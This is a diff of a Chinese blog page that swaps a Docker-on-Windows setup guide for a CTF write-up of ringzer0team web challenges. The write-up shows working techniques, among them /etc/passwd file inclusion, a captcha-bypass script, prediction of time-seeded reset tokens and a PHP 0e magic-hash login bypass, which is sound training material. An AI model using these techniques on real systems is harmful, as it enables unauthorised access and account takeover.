@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="docker,ics," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -89,22 +89,24 @@
 
 
 
-<meta name="description" content="由于准备自己写个虚拟机，以及日后ctf题环境的搭建等，准备开始接触docker。相比于vmware等虚拟机软件，docker能很好的做出一个隔离linux的环境，并且它能直接调用物理机硬件，而不像vmware是自己虚拟化硬件，这样在docker容器里跑cuda调用本机的显卡就有可能了。下面记录一下自己的docker搭建过程。">
+<meta name="description" content="Big Brother is watching题目地址： https://ringzer0team.com/challenges/212
+题目提示：Even Google cannot find this onegoogle是搜索引擎，能阻止它的自然是。。。robots.txt啦访问https://ringzer0team.com/robots.txt12User-agent: *Disallow">
 <meta property="og:type" content="article">
-<meta property="og:title" content="windows平台下Docker环境搭建">
-<meta property="og:url" content="http://yoursite.com/2017/02/13/windows平台下Docker环境搭建/index.html">
+<meta property="og:title" content="ringzer0team-web-writeup">
+<meta property="og:url" content="http://yoursite.com/2017/06/30/ringzer0team-web-writeup/index.html">
 <meta property="og:site_name" content="Chybeta">
-<meta property="og:description" content="由于准备自己写个虚拟机，以及日后ctf题环境的搭建等，准备开始接触docker。相比于vmware等虚拟机软件，docker能很好的做出一个隔离linux的环境，并且它能直接调用物理机硬件，而不像vmware是自己虚拟化硬件，这样在docker容器里跑cuda调用本机的显卡就有可能了。下面记录一下自己的docker搭建过程。">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/docker1.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/docker2.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/docker4.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/docker5.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/dockerwenti1.jpg">
-<meta property="og:updated_time" content="2017-03-06T15:36:02.837Z">
+<meta property="og:description" content="Big Brother is watching题目地址： https://ringzer0team.com/challenges/212
+题目提示：Even Google cannot find this onegoogle是搜索引擎，能阻止它的自然是。。。robots.txt啦访问https://ringzer0team.com/robots.txt12User-agent: *Disallow">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/4.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/5.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/6.jpg?raw=truehttps://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/6.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/8.jpg?raw=true">
+<meta property="og:updated_time" content="2017-07-01T10:45:54.432Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="windows平台下Docker环境搭建">
-<meta name="twitter:description" content="由于准备自己写个虚拟机，以及日后ctf题环境的搭建等，准备开始接触docker。相比于vmware等虚拟机软件，docker能很好的做出一个隔离linux的环境，并且它能直接调用物理机硬件，而不像vmware是自己虚拟化硬件，这样在docker容器里跑cuda调用本机的显卡就有可能了。下面记录一下自己的docker搭建过程。">
-<meta name="twitter:image" content="http://ojp0pjljj.bkt.clouddn.com/docker1.jpg">
+<meta name="twitter:title" content="ringzer0team-web-writeup">
+<meta name="twitter:description" content="Big Brother is watching题目地址： https://ringzer0team.com/challenges/212
+题目提示：Even Google cannot find this onegoogle是搜索引擎，能阻止它的自然是。。。robots.txt啦访问https://ringzer0team.com/robots.txt12User-agent: *Disallow">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/4.jpg?raw=true">
 
 
 
@@ -132,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/02/13/windows平台下Docker环境搭建/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/06/30/ringzer0team-web-writeup/"/>
 
 
 
 
 
-  <title> windows平台下Docker环境搭建 | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title> ringzer0team-web-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -304,7 +306,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/windows平台下Docker环境搭建/">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/30/ringzer0team-web-writeup/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="chybeta">
@@ -328,7 +330,7 @@
             
             
               
-                windows平台下Docker环境搭建
+                ringzer0team-web-writeup
               
             
           </h1>
@@ -343,8 +345,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T20:13:30+08:00">
-                2017-02-13
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-06-30T18:10:49+08:00">
+                2017-06-30
               </time>
             
 
@@ -354,28 +356,6 @@
           </span>
 
           
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ICS/" itemprop="url" rel="index">
-                    <span itemprop="name">ICS</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
 
           
             
@@ -385,7 +365,7 @@
 
           
           
-             <span id="/2017/02/13/windows平台下Docker环境搭建/" class="leancloud_visitors" data-flag-title="windows平台下Docker环境搭建">
+             <span id="/2017/06/30/ringzer0team-web-writeup/" class="leancloud_visitors" data-flag-title="ringzer0team-web-writeup">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -412,37 +392,37 @@
       
 
       
-        <p>由于准备自己写个虚拟机，以及日后ctf题环境的搭建等，准备开始接触docker。相比于vmware等虚拟机软件，docker能很好的做出一个隔离linux的环境，并且它能直接调用物理机硬件，而不像vmware是自己虚拟化硬件，这样在docker容器里跑cuda调用本机的显卡就有可能了。下面记录一下自己的docker搭建过程。</p>
-<a id="more"></a>
-<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>win下我们一般直接选择 Docker Toolbox</p>
-<h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><p>docker的官网：<a href="https://www.docker.com/products/docker-toolbox" target="_blank" rel="external">下载地址</a><br>但官网下载会很慢，甚至下载了好久突然间失败hh</p>
-<h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><p>镜像站：<a href="https://get.daocloud.io/toolbox/" target="_blank" rel="external">下载地址</a><br>速度快，但版本的更新问题啥的自己注意。</p>
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>下载的exe打开，一路跟着提示走。</p>
-<ul>
-<li>可以自己选择安装位置,但要记住。后面要用到。这里为 D:\Docker Toolbox</li>
-<li>注意需要安装virtualbox，因为我们是在win平台下安装docker，而docker是高度依赖linux的，所以这里需要virtualbox（开源免费）来提供win平台下linux内核的接口与特性</li>
-<li>需要安装git for windows，若原本机子中已经有了，可以勾掉不选择。</li>
-<li>kitematic是docker的GUI工具，也顺便安了吧。不过一般咱都是用命令行的嘛。</li>
-<li>耐心等待安装过程结束</li>
-</ul>
-<h1 id="初次启动"><a href="#初次启动" class="headerlink" title="初次启动"></a>初次启动</h1><p>安装完成后，桌面上会多出三个图标</p>
-<ul>
-<li>Oracle VM VirtualBox</li>
-<li>Kitematic (Alpha)</li>
-<li>Docker Quickstart Terminal</li>
-</ul>
-<p>这里我们只需要先打开（双击）第三个。第一次运行时，黑屏幕上只有光标，可能需要先打一个回车。一般情况下如下：</p>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/docker1.jpg" alt=""></p>
-<p>可能等很久都没有反应，我说的是 “可能”hh<br>注意到里面的意思是要把 boot2docker 下载下来，记住下载路径：</p>
-<pre><code>C:\Users\ASUS\.docker\machine\cache
-</code></pre><p>打开dokcer的安装路径（以我的安装路径为例）D:\Docker Toolbox<br>将里面的 boot2docker.iso 拷贝到 下载路径里</p>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/docker2.jpg" alt=""></p>
-<p>回到桌面运行 Docker Quickstart Terminal，可能需要再按一次回车</p>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/docker4.jpg" alt=""></p>
-<p>等“安装”完成，控制台会出现：<br><img src="http://ojp0pjljj.bkt.clouddn.com/docker5.jpg" alt=""></p>
-<p>完成后最好重启一下<br>这样就行啦。</p>
-<h1 id="可能的问题"><a href="#可能的问题" class="headerlink" title="可能的问题"></a>可能的问题</h1><h2 id="初始化问题"><a href="#初始化问题" class="headerlink" title="初始化问题"></a>初始化问题</h2><p><img src="http://ojp0pjljj.bkt.clouddn.com/dockerwenti1.jpg" alt=""><br>解决方法：将 virtualbox 和 docker 卸载掉，重启，再重新安装</p>
-<h2 id="Terminal一直自动关闭"><a href="#Terminal一直自动关闭" class="headerlink" title="Terminal一直自动关闭"></a>Terminal一直自动关闭</h2><p>解决方法：重启电脑……</p>
+        <h1 id="Big-Brother-is-watching"><a href="#Big-Brother-is-watching" class="headerlink" title="Big Brother is watching"></a>Big Brother is watching</h1><p>题目地址： <a href="https://ringzer0team.com/challenges/212" target="_blank" rel="external">https://ringzer0team.com/challenges/212</a></p>
+<p>题目提示：Even Google cannot find this onegoogle是搜索引擎，能阻止它的自然是。。。robots.txt啦<br>访问<a href="https://ringzer0team.com/robots.txt" target="_blank" rel="external">https://ringzer0team.com/robots.txt</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">User-agent: *</div><div class="line">Disallow: /16bfff59f7e8343a2643bdc2ee76b2dc/</div></pre></td></tr></table></figure></p>
+<p>访问 <a href="https://ringzer0team.com/16bfff59f7e8343a2643bdc2ee76b2dc/" target="_blank" rel="external">https://ringzer0team.com/16bfff59f7e8343a2643bdc2ee76b2dc/</a></p>
+<p>得到flag；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-G5swO95w0c7R5fq0sa85nVs5dK49O04i</div></pre></td></tr></table></figure></p>
+<h1 id="Looking-for-password-file"><a href="#Looking-for-password-file" class="headerlink" title="Looking for password file"></a>Looking for password file</h1><p>题目地址：<a href="http://ringzer0team.com:1008/?page=lorem.php" target="_blank" rel="external">http://ringzer0team.com:1008/?page=lorem.php</a></p>
+<p>读取password，猜测是passwd文件。访问：<a href="http://ringzer0team.com:1008/?page=/etc/passwd" target="_blank" rel="external">http://ringzer0team.com:1008/?page=/etc/passwd</a></p>
+<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-zH9g1934v774Y7Zx5s16t5ym8Z</div></pre></td></tr></table></figure></p>
+<h1 id="Area-51"><a href="#Area-51" class="headerlink" title="Area 51"></a>Area 51</h1><p>题目地址：<a href="https://ringzer0team.com/challenges/48" target="_blank" rel="external">https://ringzer0team.com/challenges/48</a></p>
+<p>题目提示：Access to this area is restricted using some secure .htaccess</p>
+<p>.htaccess中可以限制各种请求。通过尝试后，抓包，改请求方式GET为PUT。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-w4KRr557y626izv567758O52</div></pre></td></tr></table></figure></p>
+<h1 id="Headache"><a href="#Headache" class="headerlink" title="Headache"></a>Headache</h1><p>题目提示：Answer is closer than you think!</p>
+<p>head，所以我们抓包看头部。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-365m4fU5p2DVEQbfrptDE5Ru]</div></pre></td></tr></table></figure></p>
+<h1 id="Words-mean-something"><a href="#Words-mean-something" class="headerlink" title="Words mean something?"></a>Words mean something?</h1><p>给了一段不知所云的文字。。不懂就抓包咯。抓包后在cookie处发现<code>flag：0</code>。修改后发包得到flag：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/4.jpg?raw=true" alt=""></p>
+<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-AnlAb6QxDpQvg1yn2bAhyOJw</div></pre></td></tr></table></figure></p>
+<h1 id="Admin-Panel"><a href="#Admin-Panel" class="headerlink" title="Admin Panel"></a>Admin Panel</h1><p>有一个登陆框，随便输点什么进去，抓包后发现一个302跳转，在跳转页面里有一个奇怪的东西，见下：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/5.jpg?raw=true" alt=""></p>
+<p>将方法改成GET请求，在尾部添加：<code>?showflagforme=yesIwantafla</code>。见下：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/6.jpg?raw=truehttps://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/6.jpg?raw=true" alt=""></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-Sfi8sZgAK0ddMjVSOQU2rMfUWS</div></pre></td></tr></table></figure></p>
+<h1 id="Captcha-I"><a href="#Captcha-I" class="headerlink" title="Captcha I"></a>Captcha I</h1><p>题目地址：<a href="http://captcha.ringzer0team.com:7421/form1.php" target="_blank" rel="external">http://captcha.ringzer0team.com:7421/form1.php</a><br>测试一次后，题目提示说要验证一千次。查看源代码，可以发现如下js代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">doIt</span>(<span class="params"></span>)</span>&#123;</div><div class="line">	<span class="keyword">var</span> A = <span class="built_in">document</span>.getElementById(<span class="string">'captcha-form'</span>).value;</div><div class="line">	<span class="keyword">if</span> (A == <span class="string">"ehage"</span>)&#123;</div><div class="line">		<span class="built_in">document</span>.forms[<span class="string">"Form1"</span>].submit();</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		alert(<span class="string">"BAD Captcha"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
+<p>其中if判断条件里的<code>ehage</code>就是当前的验证码，所以只要写脚本提取出这段字符串，然后再发包就行啦。脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">cookie = &#123;<span class="string">'_ga'</span>:<span class="string">'GA1.2.1373385590.1498799275'</span>,<span class="string">'_gid'</span>:<span class="string">'GA1.2.867459789.1498799275'</span>,<span class="string">'_gat'</span>:<span class="string">'1'</span>,<span class="string">'PHPSESSID'</span>:<span class="string">'1kr76vh1164sbgeflnngimi321'</span>&#125;</div><div class="line">url = <span class="string">'http://captcha.ringzer0team.com:7421'</span></div><div class="line">headers = &#123;<span class="string">'Authorization'</span>:<span class="string">'Basic Y2FwdGNoYTpRSmM5VTZ3eEQ0U0ZUMHU='</span>&#125;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">	 <span class="comment"># get captacha</span></div><div class="line">	 r = requests.get(<span class="string">"http://captcha.ringzer0team.com:7421/form1.php"</span>,cookies=cookie,headers=headers)</div><div class="line">	 start_addr = r.text.find(<span class="string">'if (A == "'</span>) + len(<span class="string">'if (A == "'</span>)</div><div class="line">	 end_addr = r.text.find(<span class="string">'"'</span>,start_addr)</div><div class="line">	 captcha = r.text[start_addr:end_addr]</div><div class="line">	 print(i,<span class="string">":"</span>,captcha)</div><div class="line">	 k = requests.get(<span class="string">"http://captcha.ringzer0team.com:7421/captcha/captchabroken.php?new"</span>,cookies=cookie,headers=headers)</div><div class="line">	 data = &#123;<span class="string">'captcha'</span>: captcha&#125;</div><div class="line">	 k = requests.post(<span class="string">'http://captcha.ringzer0team.com:7421/captcha1.php'</span>,cookies=cookie,headers=headers,data=data)</div></pre></td></tr></table></figure></p>
+<p>跑完后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Congrats The flag is &quot;9bc635d4385e8a1775ad98980f44eb7d1714f69b&quot;</div></pre></td></tr></table></figure></p>
+<h1 id="Password-reset"><a href="#Password-reset" class="headerlink" title="Password reset"></a>Password reset</h1><p>有一个登陆框，需要用户名和密码，还有一个重置（reset）功能。题目提供了源码。如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset_username'</span>])) &#123;</div><div class="line">		srand(time());</div><div class="line">		$token =</div><div class="line">		rand(<span class="number">1000000000000000</span>,<span class="number">9999999999999999</span>);</div><div class="line"></div><div class="line">		$success = <span class="string">'&lt;div class="success"&gt;Reset password link has been sent to admin@youdontownthisemail.com. Please follow the link ...'</span></div><div class="line">		$hSql-&gt;FastQuery(<span class="string">'DELETE FROM chal_113 WHERE ip_addr = ?'</span>, <span class="keyword">array</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</div><div class="line">		$hSql-&gt;FastQuery(<span class="string">'insert into chal_113 values (?,?,?)'</span>, <span class="keyword">array</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>], $token, time() + <span class="number">3600</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(URL_HANDLE::GetInstance()-&gt;get-&gt;k != <span class="keyword">null</span>) &#123;</div><div class="line">		$result = reset($hSql-&gt;FastQuery(<span class="string">'SELECT * FROM chal_113 WHERE ip_addr = ? AND recovery_key = ? '</span>, <span class="keyword">array</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>], URL_HANDLE::GetInstance()-&gt;get-&gt;k)));</div><div class="line">		<span class="keyword">if</span>($hSql-&gt;RowCount() != <span class="number">0</span>) &#123;</div><div class="line">				<span class="keyword">if</span>($result-&gt;expired_time &gt; time()) &#123;</div><div class="line">						$success = <span class="string">'&lt;div class="success"&gt;Here\'s your new password: XXXXXXXXXXXXXX&lt;/div&gt;'</span>;</div><div class="line">				&#125; <span class="keyword">else</span> &#123;</div><div class="line">						$success = <span class="string">'&lt;div class="error"&gt;Expired recovery key!&lt;/div&gt;'</span>;</div><div class="line">				&#125;</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">				$success = <span class="string">'&lt;div class="error"&gt;Invalid recovery key!&lt;/div&gt;'</span>;</div><div class="line">		&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>伪随机数问题，还有就是关于unix时间戳的知识。目标很明确要对admin重置密码，当点了reset后，会根据当前的time生成一个token并存放在数据库中，这个就是下文的k值。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/8.jpg?raw=true" alt=""></p>
+<p>注意图片中是：2017 06:39:41 -0400。记得计算上时差为4个小时。所以实际时间应该是2017-07-01 10:39:41。写一个php脚本，生成需要的16位的digit code。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$t = strtotime(<span class="string">'2017-07-01 10:39:41'</span>);</div><div class="line"><span class="keyword">echo</span>($t . <span class="string">"&lt;br&gt;"</span>);</div><div class="line">srand($t);</div><div class="line">$token = rand(<span class="number">1000000000000000</span>,<span class="number">9999999999999999</span>);</div><div class="line"><span class="keyword">echo</span> $token;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>上面代码在win平台下无法生成16位的code，这个不知道为什么。。。我换到unix环境后生成的token为 32933381064794967。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ringzer0team.com/challenges/113/?k=3293338106479496</div></pre></td></tr></table></figure></p>
+<p>得到hint：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Here&apos;s your new password: Thi%P@s50rD!sM1n3*</div></pre></td></tr></table></figure></p>
+<p>登陆，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-DlwwTV7vCQf4Dn281Yhb802x5U</div></pre></td></tr></table></figure></p>
+<h1 id="PHP-Fairy"><a href="#PHP-Fairy" class="headerlink" title="PHP Fairy"></a>PHP Fairy</h1><p>有一个登陆框。题目给了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$output = <span class="string">""</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>])) &#123;</div><div class="line">  $content = file_get_contents(<span class="keyword">__FILE__</span>);</div><div class="line">  $content = preg_replace(<span class="string">'/FLAG\-[0-9a-zA-Z_?!.,]+/i'</span>, <span class="string">'FLAG-XXXXXXXXXXXXXXXXXXXXXXX'</span>, $content);</div><div class="line">  <span class="keyword">echo</span> <span class="string">'&lt;div class="code-highlight"&gt;'</span>;</div><div class="line">  highlight_string($content);</div><div class="line">  <span class="keyword">echo</span> <span class="string">'&lt;/div&gt;'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</div><div class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">'/^[^\W_]+$/'</span>, $_GET[<span class="string">'pass'</span>])) &#123;</div><div class="line">    $output = <span class="string">"Don't hack me please :("</span>;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line"></div><div class="line">    $pass = md5(<span class="string">"admin1674227342"</span>);</div><div class="line">    <span class="keyword">if</span> ((((((((($_GET[<span class="string">'pass'</span>] == $pass)))) &amp;&amp; (((($pass !== $_GET[<span class="string">'pass'</span>]))))) || ((((($pass == $_GET[<span class="string">'pass'</span>])))) &amp;&amp; ((($_GET[<span class="string">'pass'</span>] !== $pass)))))))) &#123; <span class="comment">// Trolling u lisp masta</span></div><div class="line">      <span class="keyword">if</span> (strlen($pass) == strlen($_GET[<span class="string">'pass'</span>])) &#123;</div><div class="line">        $output = <span class="string">"&lt;div class='alert alert-success'&gt;FLAG-XXXXXXXXXXXXXXXXXXXXXXX&lt;/div&gt;"</span>;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $output = <span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"</span>;</div><div class="line">      &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      $output = <span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>考察php弱类型。经过md5加密后生成以0e开头的字符串，而以0e开头的字符串用<code>==</code>比较时会被转换成<code>0 == 0</code>即成立。而<code>!==</code> 不仅比较值，而且还会比较类型。所以我们只要传入pass的值为一个0e开头的值，并且长度为32位（$pass长度为32位），比如说：0e509367213418206700842008763514。</p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-K7PY48gt02T1yvoO9jzP694FztgR1jIS</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -485,21 +465,13 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/docker/" rel="tag"># docker</a>
-          
-            <a href="/tags/ics/" rel="tag"># ics</a>
-          
-        </div>
-      
 
       
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/02/02/数据挖掘比赛（5）ten-Minutes-to-pandas中文版下/" rel="next" title="数据挖掘比赛（5）ten Minutes to pandas中文版下">
-                <i class="fa fa-chevron-left"></i> 数据挖掘比赛（5）ten Minutes to pandas中文版下
+              <a href="/2017/06/30/ringzer0team-js-writeup/" rel="next" title="ringzer0team-js-writeup">
+                <i class="fa fa-chevron-left"></i> ringzer0team-js-writeup
               </a>
             
           </div>
@@ -508,8 +480,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/02/14/win下Docker默认存储位置修改/" rel="prev" title="win下Docker默认存储位置修改">
-                win下Docker默认存储位置修改 <i class="fa fa-chevron-right"></i>
+              <a href="/3017/06/19/ACM-OJ-长期更新/" rel="prev" title="ACM-OJ[长期更新]">
+                ACM-OJ[长期更新] <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -675,7 +647,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#下载"><span class="nav-number">1.</span> <span class="nav-text">下载</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#法一"><span class="nav-number">1.1.</span> <span class="nav-text">法一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#法二"><span class="nav-number">1.2.</span> <span class="nav-text">法二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#安装"><span class="nav-number">2.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#初次启动"><span class="nav-number">3.</span> <span class="nav-text">初次启动</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#可能的问题"><span class="nav-number">4.</span> <span class="nav-text">可能的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#初始化问题"><span class="nav-number">4.1.</span> <span class="nav-text">初始化问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Terminal一直自动关闭"><span class="nav-number">4.2.</span> <span class="nav-text">Terminal一直自动关闭</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Big-Brother-is-watching"><span class="nav-number">1.</span> <span class="nav-text">Big Brother is watching</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Looking-for-password-file"><span class="nav-number">2.</span> <span class="nav-text">Looking for password file</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Area-51"><span class="nav-number">3.</span> <span class="nav-text">Area 51</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Headache"><span class="nav-number">4.</span> <span class="nav-text">Headache</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Words-mean-something"><span class="nav-number">5.</span> <span class="nav-text">Words mean something?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Admin-Panel"><span class="nav-number">6.</span> <span class="nav-text">Admin Panel</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Captcha-I"><span class="nav-number">7.</span> <span class="nav-text">Captcha I</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Password-reset"><span class="nav-number">8.</span> <span class="nav-text">Password reset</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-Fairy"><span class="nav-number">9.</span> <span class="nav-text">PHP Fairy</span></a></li></ol></div>
             
 
           </div>
